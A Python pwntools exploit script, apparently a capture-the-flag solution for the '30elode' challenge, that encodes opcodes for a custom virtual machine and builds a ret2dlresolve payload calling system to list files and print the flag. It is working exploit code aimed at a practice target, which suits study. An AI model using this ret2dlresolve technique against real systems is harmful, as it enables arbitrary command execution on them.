from pwn import * 

elf = context.binary = ELF('./30elode')
context.terminal = ()
def print_dl(payload):
    for i in range(0, len(payload), 8):
        print(payload[i:i+8].hex())

if args.REMOTE:
    p = remote('30elode.challs.olicyber.it', 38301)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b vm
        c        
        b _dl_runtime_resolve_xsavec
        b _dl_fixup
                  
    ''')
else:
    p = elf.process()

def mov(where,what):
    return b'\x0E'+ p16(what) + bytes([where])
def push_word(what):
    return b'\x09\x01'


def push_byte(what):
    return b'\x09\x00' + what + b'\x00'


def push_string(what):
    ret_string = b""
    for i in range(0, len(what)):
        print(f"pushing byte {what[i]}")
        ret_string += push_byte(bytes([what[i]]))
    return ret_string


def pop_reg(where):
    return b'\x0A' + bytes([where]) + b'\x00\x00'


def push_reg(where):
    return b'\x09\x06' + bytes([where]) + b'\x00'


def mov_reg(where):
    return b'\x0B' + bytes([where]) + b'\x00\x00'

def popa():
    return b'\x0D\x00\x00\x00'

def pusha():
    return b'\x0C\x00\x00\x00'
dlresolve = Ret2dlresolvePayload(elf, symbol="system",args=["ls 1>&2"],data_addr=0x50E8)
print_dl(dlresolve.payload)

shellcode_retadd = b""
shellcode_retadd += popa()
shellcode_retadd += b"\x0E\xde\x0c\x00"
shellcode_retadd += b"\x01\xc0\x00\x00"
shellcode_retadd += b'\x0E' + p16(dlresolve.reloc_index) + bytes([11])
shellcode_retadd += pusha()


buf_dl = b""
# system
for i in range(0,len(dlresolve.payload), 8):
    buf_dl += push_string(dlresolve.payload[i:i+8][::-1]) # carica stringa system nello stack
    buf_dl += pop_reg((i//8)+1) 


final_payload = shellcode_retadd + buf_dl + b'cat flag 1>&2\x00\x00\x00'
print(len(final_payload))
p.sendlineafter(b':', str(len(final_payload)).encode())
p.sendlineafter(b':', final_payload)
p.interactive()